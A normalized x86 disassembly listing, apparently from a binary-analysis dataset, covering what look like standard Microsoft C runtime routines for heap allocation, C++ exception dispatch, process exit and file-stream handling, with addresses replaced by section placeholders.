lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_409ef2
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40a1e8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40a203
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_40aaa2
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40a29e
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40a54a
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40a29e
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_40aaa2
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40aa4c
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40a445
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4086bc
add esp 0x14
mov ebx eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_40d308
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_40aaa2
push 0x1
push esi
call sub_40a973
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_40a4ed
add esp 0xc
test eax eax
jne r-xdata
call sub_40aaa2
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40a5fe
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_40a445
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4086bc
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408593
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a5fe
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_40a4ed
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40bce0
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_40a54a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_40aaa2
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_40aa00
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40a5fe
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40a7af
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_408453
call sub_408495
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40a54a
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40a679
add esp 0x2c
test eax eax
je r-xdata
sub_40a679
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_40851a
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_40a73f
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40a73f
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
cmp [ ebp - 0x2c ] ebx
je r-xdata
call sub_4087e2
push eax
push edi
call sub_40a973
pop ecx
pop ecx
sub_40a785
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40a7af
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_40d308
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_40d308
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40aaa2
push 0x1
push edi
call sub_40d324
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d308
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d308
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40d324
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_40d324
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40d324
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_408fa0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_40d340
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_40a9da
pop ecx
pop ecx
push eax
push edi
call sub_408fa0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40a9da
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_408487
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40a9da
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40848e
jmp r-xdata
push eax
call sub_40a9da
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40a973
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_408487
or [ ebp - 0x4 ] 0xffffffff
sub_40a9da
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40aa00
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_408805
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_408805
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40aa4c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
push 0xa
call sub_40d1b5
push 0x16
call sub_40ea4c
pop ecx
pop ecx
push 0x3
call sub_40ac56
and [ ebp - 0x4 ] 0x0
sub_40aaa2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40aa4c
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40aaf8
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
jne r-xdata
push [ esp + 0x18 ]
call sub_4083df
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_4083b0
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call sub_4096e7
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
mov eax edi
push esi
call sub_40a1e8
test eax eax
pop ecx
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push ebp
call sub_409ef2
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_409a3d
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_40b1f0
push ebx
push ebp
call sub_409712
add esp 0x14
jmp r-xdata
mov eax esi
push eax
push ebx
push edi
call sub_40b1f0
push ebx
push ebp
call sub_409712
add esp 0x14
mov eax esi
test edi edi
jne r-xdata
sub_40ac67
push edi
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_40ad00
pop ecx
pop ecx
test ebx ebx
pop ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
push rw-data
push rw-data
call sub_40ad00
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_40ad1a
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4096e7
test eax eax
pop ecx
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop esi
retn
mov eax [ esi - 0x4 ]
pop esi
sub eax 0x9
retn
sub_40ad43
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_40d55c
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_40d36f
pop ecx
jmp r-xdata
push 0x2
call sub_40d55c
push 0x1
mov ebp eax
call sub_40d55c
pop ecx
cmp eax ebp
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_40d55c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_40d4e2
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je r-xdata
sub_40adf6
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_4083b0
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40ae21
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40ae5c
test eax eax
pop ecx
je r-xdata
push esi
call sub_40aec1
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40d599
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_40ae5c
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_40b043
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
